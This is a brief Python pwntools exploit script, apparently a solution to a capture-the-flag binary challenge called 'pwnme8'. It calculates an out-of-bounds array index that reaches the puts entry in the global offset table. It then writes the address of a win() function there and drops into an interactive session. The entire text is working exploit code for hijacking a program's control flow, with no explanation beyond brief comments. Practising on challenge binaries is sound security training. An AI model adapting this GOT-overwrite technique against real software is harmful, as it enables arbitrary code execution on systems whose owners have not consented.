from pwn import *

exe = './pwnme8'
elf = ELF(exe)
b = process(exe)

win_addr   = elf.symbols['win']          # 0x401196
puts_got   = elf.got['puts']             # address of puts in GOT
target     = elf.symbols['target']       # base of target array
index = (puts_got - target) // 8

log.info(f"win:      {hex(win_addr)}")
log.info(f"puts@GOT: {hex(puts_got)}")
log.info(f"target:   {hex(target)}")
log.info(f"index:    {index}")

b.sendline(str(index).encode())    # send index
b.sendline(str(win_addr).encode()) # send win() address as value

b.interactive()